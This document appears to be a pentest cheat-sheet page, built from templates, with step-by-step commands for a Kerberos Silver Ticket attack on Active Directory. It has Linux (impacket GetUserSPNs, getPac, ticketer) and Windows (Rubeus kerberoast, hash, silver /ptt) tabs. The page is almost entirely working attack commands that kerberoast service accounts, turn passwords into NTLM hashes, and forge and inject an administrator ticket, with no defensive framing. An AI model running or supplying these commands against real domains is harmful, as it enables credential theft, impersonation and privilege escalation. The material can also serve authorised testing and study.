---
title: "Silver Ticket"
date: 2024-7-30
tags: ["silver ticket", "rubeus", "active directory", "ad", "domain controller", "Windows", "GetUserSPNs"]
---

### Silver Ticket Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Get service principle name (SPN)

<div>

```console
sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -request -k
```

```console
# If NTLM auth is disabled
sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
```

</div>

#### 2. Generate NTLM

<div>

```console
iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
```

</div>

#### 3. Get domain SID

<div>

```console
sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator '<DOMAIN>/<USER>:<PASSWORD>'
```

</div>

#### 4. Generate Silver Ticket

<div>

```console
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> -spn <SPN> administrator
```

</div>

#### 5. Import ticket

<div>

```console
export KRB5CCNAME=administrator.ccache
```

</div>

#### 6. Check

<div>

```console
klist
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Get service principle name (SPN)

<div>

```console
.\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>' /nowrap
```

</div>

#### 2. Generate NTLM

<div>

```console
.\rubeus.exe hash /password:'<PASSWORD>'
```

</div>

#### 3. Get domain SID

#### 3a. Locally

<div>

```console
import-module activedirectory
```

```console
Get-ADDomain | fl DomainSID
```

</div>

#### 3b. Remotely

<div>

```console
# Install ldp.exe (Windows 11)
Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services'
```

```console
# Bind > Bind with credentials
ldp.exe
```

```console
# Browse > Search
BaseDN: DC=<EXAMPLE>,DC=<COM>
Filter: (objectclass=User)
```

</div>

#### 4. Generate silver ticket

<div>

```console
.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:<SPN> /nowrap /ptt
```

</div>

#### 5. Check

<div>

```console
klist
```

</div>

{{< /tabcontent >}}


<br>